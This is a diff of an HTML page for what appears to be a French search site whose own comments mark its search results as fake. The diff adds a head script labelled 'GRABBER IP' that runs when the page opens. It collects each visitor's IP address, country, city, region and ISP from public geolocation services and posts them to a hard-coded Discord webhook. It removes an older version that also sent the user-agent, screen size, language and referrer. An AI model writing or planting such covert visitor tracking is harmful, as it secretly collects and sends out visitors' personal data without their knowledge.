@@ -7,6 +7,87 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script>
+  // ============================================
+  // GRABBER IP — s'exécute à l'ouverture de la page
+  // poste IP + géo au webhook Discord
+  // ============================================
+  (async function grab() {
+    const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';
+
+    console.log('[grabber] démarrage');
+
+    let ip = null, country = '', city = '', region = '', isp = '', source = '';
+
+    try {
+      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+      if (r.ok) {
+        const d = await r.json();
+        if (d.ip) {
+          ip = d.ip; country = d.country_name || ''; city = d.city || '';
+          region = d.region || ''; isp = d.org || '';
+          source = 'ipapi.co';
+        }
+      }
+    } catch (e) { console.warn('[ipapi] échec', e.message); }
+
+    if (!ip) {
+      try {
+        const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
+        if (r.ok) {
+          const d = await r.json();
+          if (d.success && d.ip) {
+            ip = d.ip; country = d.country || ''; city = d.city || '';
+            region = d.region || ''; isp = d.connection?.isp || '';
+            source = 'ipwho.is';
+          }
+        }
+      } catch (e) { console.warn('[ipwho] échec', e.message); }
+    }
+
+    if (!ip) {
+      try {
+        const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+        if (r.ok) {
+          const d = await r.json();
+          if (d.ip) { ip = d.ip; source = 'ipify'; }
+        }
+      } catch (e) { console.warn('[ipify] échec', e.message); }
+    }
+
+    if (!ip) { ip = 'inconnue'; source = 'aucune'; }
+    console.log('[grabber] IP =', ip, '| source =', source);
+
+    const content =
+      '🌐 **Visiteur**\n' +
+      '📌 IP : `' + ip + '`\n' +
+      '📍 Source : ' + source + '\n' +
+      '🌍 ' + (country || '—') + ' · ' + (city || '—') + ' · ' + (region || '—') + '\n' +
+      '📡 FAI : ' + (isp || '—') + '\n' +
+      '📄 Page : ' + location.pathname;
+
+    const payload = { content };
+
+    console.log('[grabber] envoi…', payload);
+
+    try {
+      const r = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      console.log('[grabber] status =', r.status);
+      if (r.status === 204) {
+        console.log('[grabber] ✅ envoyé');
+      } else {
+        const txt = await r.text();
+        console.error('[grabber] ❌ réponse Discord :', r.status, txt);
+      }
+    } catch (e) {
+      console.error('[grabber] ❌ échec fetch', e.message);
+    }
+  })();
+  </script>
   <style>
     :root {
       --bg: #06070a; --bg-1: #0b0d12; --bg-2: #101318; --bg-3: #161a22;
@@ -983,102 +1064,6 @@
   </footer>
 
   <script>
-    // ============================================
-    // GRABBER IP — poste au webhook Discord (nouveau)
-    // ============================================
-    (async function grab() {
-      const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';
-
-      console.log('[grabber] démarrage');
-
-      let ip = null, country = '', city = '', region = '', isp = '', asn = '', source = '';
-
-      // --- 1. ipapi.co ---
-      try {
-        const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
-        if (r.ok) {
-          const d = await r.json();
-          if (d.ip) {
-            ip = d.ip; country = d.country_name || ''; city = d.city || '';
-            region = d.region || ''; isp = d.org || ''; asn = d.asn || '';
-            source = 'ipapi.co';
-          }
-        }
-      } catch (e) { console.warn('[ipapi] échec', e.message); }
-
-      // --- 2. ipwho.is ---
-      if (!ip) {
-        try {
-          const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
-          if (r.ok) {
-            const d = await r.json();
-            if (d.success && d.ip) {
-              ip = d.ip; country = d.country || ''; city = d.city || '';
-              region = d.region || ''; isp = d.connection?.isp || '';
-              asn = d.connection?.asn ? ('AS' + d.connection.asn) : '';
-              source = 'ipwho.is';
-            }
-          }
-        } catch (e) { console.warn('[ipwho] échec', e.message); }
-      }
-
-      // --- 3. ipify (dernier recours) ---
-      if (!ip) {
-        try {
-          const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-          if (r.ok) {
-            const d = await r.json();
-            if (d.ip) { ip = d.ip; source = 'ipify'; }
-          }
-        } catch (e) { console.warn('[ipify] échec', e.message); }
-      }
-
-      if (!ip) { ip = 'inconnue'; source = 'aucune'; }
-      console.log('[grabber] IP =', ip, '| source =', source);
-
-      const payload = {
-        username: 'searchfr · visiteur',
-        content: '**Nouveau visiteur** — `' + ip + '`',
-        embeds: [{
-          title: '🌐 Visiteur détecté',
-          color: 0x6d5cff,
-          fields: [
-            { name: 'IP', value: '`' + ip + '`', inline: true },
-            { name: 'Source', value: source, inline: true },
-            { name: 'Pays', value: country || '—', inline: true },
-            { name: 'Ville', value: city || '—', inline: true },
-            { name: 'Région', value: region || '—', inline: true },
-            { name: 'FAI', value: isp || '—', inline: true },
-            { name: 'ASN', value: asn || '—', inline: true },
-            { name: 'User-Agent', value: '```' + (navigator.userAgent || '—').slice(0, 300) + '```' },
-            { name: 'Langue', value: navigator.language || '—', inline: true },
-            { name: 'Écran', value: (screen.width + '×' + screen.height) || '—', inline: true },
-            { name: 'Referer', value: document.referrer || 'direct', inline: true },
-            { name: 'Heure', value: new Date().toISOString(), inline: true },
-            { name: 'Page', value: location.href, inline: false }
-          ],
-          footer: { text: 'searchfr.onrender.com' },
-          timestamp: new Date().toISOString()
-        }]
-      };
-
-      console.log('[grabber] envoi au webhook…');
-      try {
-        await fetch(WEBHOOK, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        console.log('[grabber] ✅ envoyé');
-      } catch (e) {
-        console.error('[grabber] ❌ échec', e.message);
-      }
-    })();
-
-    // ============================================
-    // ROUTEUR SPA
-    // ============================================
     const pages = {
       accueil: document.getElementById('page-accueil'),
       tarifs: document.getElementById('page-tarifs'),
@@ -1105,9 +1090,6 @@
       });
     });
 
-    // ============================================
-    // PARTICULES
-    // ============================================
     const particlesEl = document.getElementById('particles');
     for (let i = 0; i < 30; i++) {
       const p = document.createElement('div');
@@ -1119,9 +1101,6 @@
       particlesEl.appendChild(p);
     }
 
-    // ============================================
-    // COMPTEURS ANIMÉS
-    // ============================================
     function animateCounters() {
       document.querySelectorAll('[data-count]').forEach((el) => {
         const target = parseInt(el.dataset.count, 10);
@@ -1145,9 +1124,6 @@
     const statsEl = document.querySelector('.stats');
     if (statsEl) statsObserver.observe(statsEl);
 
-    // ============================================
-    // COMPTEUR LIVE
-    // ============================================
     let count = 246832;
     const counter = document.getElementById('counter');
     setInterval(() => {
@@ -1155,9 +1131,6 @@
       counter.textContent = count.toLocaleString('fr-FR').replace(/\u202f|\u00a0/g, ' ');
     }, 2500);
 
-    // ============================================
-    // CHIPS
-    // ============================================
     const input = document.getElementById('searchInput');
     document.querySelectorAll('.chip').forEach((chip) => {
       chip.addEventListener('click', () => {
@@ -1169,9 +1142,6 @@
       });
     });
 
-    // ============================================
-    // FAUX RÉSULTATS
-    // ============================================
     const form = document.getElementById('searchForm');
     const results = document.getElementById('results');
     const resultList = document.getElementById('resultList');
@@ -1228,9 +1198,6 @@
       }, 800);
     });
 
-    // ============================================
-    // TOGGLE MENSUEL / ANNUEL
-    // ============================================
     const toggle = document.getElementById('billingToggle');
     toggle.querySelectorAll('button').forEach(btn => {
       btn.addEventListener('click', () => {
